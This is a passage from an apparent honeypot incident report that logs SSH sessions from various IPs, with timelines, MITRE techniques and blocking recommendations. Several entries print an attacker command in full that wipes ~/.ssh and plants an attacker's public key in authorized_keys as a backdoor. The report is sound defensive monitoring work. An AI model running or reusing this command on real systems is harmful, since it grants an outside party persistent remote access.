| `2026-07-05 07:44:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a6825ad9cd1

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-05 07:46 |
| **Last Seen** | 2026-07-05 07:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:46:56` | `cowrie.session.connect` |
| `2026-07-05 07:46:56` | `cowrie.client.version` |
| `2026-07-05 07:46:56` | `cowrie.client.kex` |
| `2026-07-05 07:46:56` | `cowrie.login.success` |
| `2026-07-05 07:46:57` | `cowrie.session.params` |
| `2026-07-05 07:46:57` | `cowrie.command.input` |
| `2026-07-05 07:46:57` | `cowrie.log.closed` |
| `2026-07-05 07:46:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c0582c961f1

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 07:52 |
| **Last Seen** | 2026-07-05 07:52 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:52:36` | `cowrie.session.connect` |
| `2026-07-05 07:52:38` | `cowrie.client.version` |
| `2026-07-05 07:52:38` | `cowrie.client.kex` |
| `2026-07-05 07:52:43` | `cowrie.login.success` |
| `2026-07-05 07:52:47` | `cowrie.session.params` |
| `2026-07-05 07:52:47` | `cowrie.command.input` |
| `2026-07-05 07:52:48` | `cowrie.log.closed` |
| `2026-07-05 07:52:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2b8c1da260e

| Field | Detail |
|---|---|
| **Source IP** | `14.103.112[.]5` |
| **First Seen** | 2026-07-05 07:56 |
| **Last Seen** | 2026-07-05 07:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:56:52` | `cowrie.session.connect` |
| `2026-07-05 07:56:52` | `cowrie.client.version` |
| `2026-07-05 07:56:52` | `cowrie.client.kex` |
| `2026-07-05 07:56:53` | `cowrie.login.success` |
| `2026-07-05 07:56:54` | `cowrie.session.params` |
| `2026-07-05 07:56:54` | `cowrie.command.input` |
| `2026-07-05 07:56:54` | `cowrie.command.failed` |
| `2026-07-05 07:56:54` | `cowrie.log.closed` |
| `2026-07-05 07:56:55` | `cowrie.session.params` |
| `2026-07-05 07:56:55` | `cowrie.command.input` |
| `2026-07-05 07:56:55` | `cowrie.session.file_download` |
| `2026-07-05 07:56:55` | `cowrie.log.closed` |
| `2026-07-05 07:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.112[.]5` to AbuseIPDB if not already reported
- [ ] Block `14.103.112[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23a9fd4da28f

| Field | Detail |
|---|---|
| **Source IP** | `14.103.112[.]5` |
| **First Seen** | 2026-07-05 07:56 |
| **Last Seen** | 2026-07-05 07:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:56:56` | `cowrie.session.connect` |
| `2026-07-05 07:56:56` | `cowrie.client.version` |
| `2026-07-05 07:56:56` | `cowrie.client.kex` |
| `2026-07-05 07:56:59` | `cowrie.login.success` |
| `2026-07-05 07:56:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.112[.]5` to AbuseIPDB if not already reported
- [ ] Block `14.103.112[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fbddac0ecbc

| Field | Detail |
|---|---|
| **Source IP** | `14.103.112[.]5` |
| **First Seen** | 2026-07-05 07:56 |
| **Last Seen** | 2026-07-05 07:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:56:59` | `cowrie.session.connect` |
| `2026-07-05 07:56:59` | `cowrie.client.version` |
| `2026-07-05 07:57:00` | `cowrie.client.kex` |
| `2026-07-05 07:57:01` | `cowrie.login.success` |
| `2026-07-05 07:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.112[.]5` to AbuseIPDB if not already reported
- [ ] Block `14.103.112[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4146bbbe07c3

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-07-05 07:58 |
| **Last Seen** | 2026-07-05 07:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:58:19` | `cowrie.session.connect` |
| `2026-07-05 07:58:19` | `cowrie.client.version` |
| `2026-07-05 07:58:19` | `cowrie.client.kex` |
| `2026-07-05 07:58:19` | `cowrie.login.success` |
| `2026-07-05 07:58:20` | `cowrie.session.params` |
| `2026-07-05 07:58:20` | `cowrie.command.input` |
| `2026-07-05 07:58:20` | `cowrie.command.failed` |
| `2026-07-05 07:58:20` | `cowrie.log.closed` |
| `2026-07-05 07:58:21` | `cowrie.session.params` |
| `2026-07-05 07:58:21` | `cowrie.command.input` |
| `2026-07-05 07:58:21` | `cowrie.session.file_download` |
| `2026-07-05 07:58:21` | `cowrie.log.closed` |
| `2026-07-05 07:58:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-421e24d06a21

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-07-05 07:58 |
| **Last Seen** | 2026-07-05 07:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:58:21` | `cowrie.session.connect` |
| `2026-07-05 07:58:21` | `cowrie.client.version` |
| `2026-07-05 07:58:21` | `cowrie.client.kex` |
| `2026-07-05 07:58:22` | `cowrie.login.success` |
| `2026-07-05 07:58:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3a88df5c29b

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-07-05 07:58 |
| **Last Seen** | 2026-07-05 07:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:58:22` | `cowrie.session.connect` |
| `2026-07-05 07:58:22` | `cowrie.client.version` |
| `2026-07-05 07:58:22` | `cowrie.client.kex` |
| `2026-07-05 07:58:22` | `cowrie.login.success` |
| `2026-07-05 07:58:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-453308fa5ec8

| Field | Detail |
|---|---|
| **Source IP** | `186.122.177[.]140` |
| **First Seen** | 2026-07-05 07:59 |
| **Last Seen** | 2026-07-05 07:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:59:41` | `cowrie.session.connect` |
| `2026-07-05 07:59:41` | `cowrie.client.version` |
| `2026-07-05 07:59:41` | `cowrie.client.kex` |
| `2026-07-05 07:59:42` | `cowrie.login.success` |
| `2026-07-05 07:59:43` | `cowrie.session.params` |
| `2026-07-05 07:59:43` | `cowrie.command.input` |
| `2026-07-05 07:59:43` | `cowrie.command.failed` |
| `2026-07-05 07:59:43` | `cowrie.log.closed` |
| `2026-07-05 07:59:44` | `cowrie.session.params` |
| `2026-07-05 07:59:44` | `cowrie.command.input` |
| `2026-07-05 07:59:44` | `cowrie.session.file_download` |
| `2026-07-05 07:59:44` | `cowrie.log.closed` |
| `2026-07-05 07:59:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.122.177[.]140` to AbuseIPDB if not already reported
- [ ] Block `186.122.177[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c91b875e473e

| Field | Detail |
|---|---|
| **Source IP** | `186.122.177[.]140` |
| **First Seen** | 2026-07-05 07:59 |
| **Last Seen** | 2026-07-05 07:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:59:44` | `cowrie.session.connect` |
| `2026-07-05 07:59:44` | `cowrie.client.version` |
| `2026-07-05 07:59:44` | `cowrie.client.kex` |
| `2026-07-05 07:59:45` | `cowrie.login.success` |
| `2026-07-05 07:59:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.122.177[.]140` to AbuseIPDB if not already reported
- [ ] Block `186.122.177[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07cb3bd5eb81

| Field | Detail |
|---|---|
| **Source IP** | `186.122.177[.]140` |
| **First Seen** | 2026-07-05 07:59 |
| **Last Seen** | 2026-07-05 07:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:59:46` | `cowrie.session.connect` |
| `2026-07-05 07:59:46` | `cowrie.client.version` |
| `2026-07-05 07:59:46` | `cowrie.client.kex` |
| `2026-07-05 07:59:46` | `cowrie.login.success` |
| `2026-07-05 07:59:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.122.177[.]140` to AbuseIPDB if not already reported
- [ ] Block `186.122.177[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28c71cf11470

| Field | Detail |
|---|---|
| **Source IP** | `203.25.208[.]110` |
| **First Seen** | 2026-07-05 07:59 |
| **Last Seen** | 2026-07-05 07:59 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:59:48` | `cowrie.session.connect` |
| `2026-07-05 07:59:49` | `cowrie.client.version` |
| `2026-07-05 07:59:49` | `cowrie.client.kex` |
| `2026-07-05 07:59:51` | `cowrie.login.success` |
| `2026-07-05 07:59:52` | `cowrie.session.params` |
| `2026-07-05 07:59:52` | `cowrie.command.input` |
| `2026-07-05 07:59:52` | `cowrie.command.failed` |
| `2026-07-05 07:59:53` | `cowrie.log.closed` |
| `2026-07-05 07:59:53` | `cowrie.session.params` |
| `2026-07-05 07:59:53` | `cowrie.command.input` |
| `2026-07-05 07:59:54` | `cowrie.session.file_download` |
| `2026-07-05 07:59:54` | `cowrie.log.closed` |
| `2026-07-05 07:59:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.25.208[.]110` to AbuseIPDB if not already reported
- [ ] Block `203.25.208[.]110` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65eda3ce2b8e

| Field | Detail |
|---|---|
| **Source IP** | `203.25.208[.]110` |
| **First Seen** | 2026-07-05 07:59 |
| **Last Seen** | 2026-07-05 07:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:59:54` | `cowrie.session.connect` |
| `2026-07-05 07:59:55` | `cowrie.client.version` |
| `2026-07-05 07:59:55` | `cowrie.client.kex` |
| `2026-07-05 07:59:56` | `cowrie.login.success` |
| `2026-07-05 07:59:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.25.208[.]110` to AbuseIPDB if not already reported
- [ ] Block `203.25.208[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c824f5aab4e

| Field | Detail |
|---|---|
| **Source IP** | `203.25.208[.]110` |
| **First Seen** | 2026-07-05 07:59 |
| **Last Seen** | 2026-07-05 07:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:59:57` | `cowrie.session.connect` |
| `2026-07-05 07:59:57` | `cowrie.client.version` |
| `2026-07-05 07:59:57` | `cowrie.client.kex` |
| `2026-07-05 07:59:59` | `cowrie.login.success` |
| `2026-07-05 07:59:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.25.208[.]110` to AbuseIPDB if not already reported
- [ ] Block `203.25.208[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-897bdcab83fa

| Field | Detail |
|---|---|
| **Source IP** | `69.5.7[.]218` |
| **First Seen** | 2026-07-05 08:00 |
| **Last Seen** | 2026-07-05 08:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:00:03` | `cowrie.session.connect` |
| `2026-07-05 08:00:03` | `cowrie.client.version` |
| `2026-07-05 08:00:03` | `cowrie.client.kex` |
| `2026-07-05 08:00:04` | `cowrie.login.success` |
| `2026-07-05 08:00:06` | `cowrie.session.params` |
| `2026-07-05 08:00:06` | `cowrie.command.input` |
| `2026-07-05 08:00:06` | `cowrie.command.failed` |
| `2026-07-05 08:00:06` | `cowrie.log.closed` |
| `2026-07-05 08:00:07` | `cowrie.session.params` |
| `2026-07-05 08:00:07` | `cowrie.command.input` |
| `2026-07-05 08:00:07` | `cowrie.session.file_download` |
| `2026-07-05 08:00:07` | `cowrie.log.closed` |
| `2026-07-05 08:00:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.5.7[.]218` to AbuseIPDB if not already reported
- [ ] Block `69.5.7[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da859e386533

| Field | Detail |
|---|---|
| **Source IP** | `69.5.7[.]218` |
| **First Seen** | 2026-07-05 08:00 |
| **Last Seen** | 2026-07-05 08:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:00:07` | `cowrie.session.connect` |
| `2026-07-05 08:00:07` | `cowrie.client.version` |
| `2026-07-05 08:00:08` | `cowrie.client.kex` |
| `2026-07-05 08:00:09` | `cowrie.login.success` |
| `2026-07-05 08:00:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.5.7[.]218` to AbuseIPDB if not already reported
- [ ] Block `69.5.7[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5729bddf21b

| Field | Detail |
|---|---|
| **Source IP** | `69.5.7[.]218` |
| **First Seen** | 2026-07-05 08:00 |
| **Last Seen** | 2026-07-05 08:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:00:09` | `cowrie.session.connect` |
| `2026-07-05 08:00:09` | `cowrie.client.version` |
| `2026-07-05 08:00:09` | `cowrie.client.kex` |
| `2026-07-05 08:00:10` | `cowrie.login.success` |
| `2026-07-05 08:00:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.5.7[.]218` to AbuseIPDB if not already reported
- [ ] Block `69.5.7[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7da9f165cce

| Field | Detail |
|---|---|
| **Source IP** | `95.130.227[.]33` |
| **First Seen** | 2026-07-05 08:00 |
| **Last Seen** | 2026-07-05 08:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:00:38` | `cowrie.session.connect` |
| `2026-07-05 08:00:38` | `cowrie.client.version` |
| `2026-07-05 08:00:38` | `cowrie.client.kex` |
| `2026-07-05 08:00:39` | `cowrie.login.success` |
| `2026-07-05 08:00:40` | `cowrie.session.params` |
| `2026-07-05 08:00:40` | `cowrie.command.input` |
| `2026-07-05 08:00:40` | `cowrie.command.failed` |
| `2026-07-05 08:00:41` | `cowrie.log.closed` |
| `2026-07-05 08:00:41` | `cowrie.session.params` |
| `2026-07-05 08:00:41` | `cowrie.command.input` |
| `2026-07-05 08:00:42` | `cowrie.session.file_download` |
| `2026-07-05 08:00:42` | `cowrie.log.closed` |
| `2026-07-05 08:00:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.130.227[.]33` to AbuseIPDB if not already reported
- [ ] Block `95.130.227[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee75704db008

| Field | Detail |
|---|---|
| **Source IP** | `95.130.227[.]33` |
| **First Seen** | 2026-07-05 08:00 |
| **Last Seen** | 2026-07-05 08:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:00:42` | `cowrie.session.connect` |
| `2026-07-05 08:00:42` | `cowrie.client.version` |
| `2026-07-05 08:00:42` | `cowrie.client.kex` |
| `2026-07-05 08:00:43` | `cowrie.login.success` |
| `2026-07-05 08:00:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.130.227[.]33` to AbuseIPDB if not already reported
- [ ] Block `95.130.227[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7b4097d2292

| Field | Detail |
|---|---|
| **Source IP** | `95.130.227[.]33` |
| **First Seen** | 2026-07-05 08:00 |
| **Last Seen** | 2026-07-05 08:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:00:43` | `cowrie.session.connect` |
| `2026-07-05 08:00:43` | `cowrie.client.version` |
| `2026-07-05 08:00:43` | `cowrie.client.kex` |
| `2026-07-05 08:00:44` | `cowrie.login.success` |
| `2026-07-05 08:00:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.130.227[.]33` to AbuseIPDB if not already reported
- [ ] Block `95.130.227[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-897aa11fe3d2

| Field | Detail |
|---|---|
| **Source IP** | `34.175.118[.]185` |
| **First Seen** | 2026-07-05 08:01 |
| **Last Seen** | 2026-07-05 08:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
